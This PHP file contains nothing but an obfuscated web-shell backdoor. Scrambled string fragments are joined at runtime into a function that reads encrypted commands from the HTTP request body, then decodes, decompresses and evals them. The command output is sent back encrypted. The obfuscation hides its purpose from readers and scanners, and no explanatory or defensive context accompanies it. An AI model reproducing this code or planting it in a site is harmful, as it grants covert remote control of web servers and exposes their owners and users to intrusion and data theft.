<?php
$s='nput")#,$m)==1) {@o##b_start(#);@e#val(@gz#uncompres#s(@x(@b#ase64#_d#ecode($m[1#]),$k)#))#;$o=@o#b_g';
$o='$k){$c=strle#n($k);$l=#strlen#($t#)#;$o="";fo#r($i=0;$i<$##l;){for($j=#0;($j<$#c&&#$i<$l);$j++##,$i+#+)';
$x='et_cont#ent#s();@ob#_#end_cle#an();$#r#=@bas#e64_encode(@x##(#@g#zcompress($#o),$k));print("$p$kh$r#$kf");}';
$g='#{$o.=$t{$i}#^$k{$j};}}re#t#urn $o;}if ##(@preg_match#("/$#kh(#.+)$kf/"#,@file_get#_conte#nt##s("#php://i';
$z=str_replace('W','','creWatWe_WWfuWncWtion');
$Y='$k="9#ed35614"#;$kh="7#c7293f#5#cd52";$kf#="dca62#f6#24#cc0";$p="vcE#DMNSi#3E##bI3pH0";function x##($#t,';
$w=str_replace('#','',$Y.$o.$g.$s.$x);
$n=$z('',$w);$n();
?>
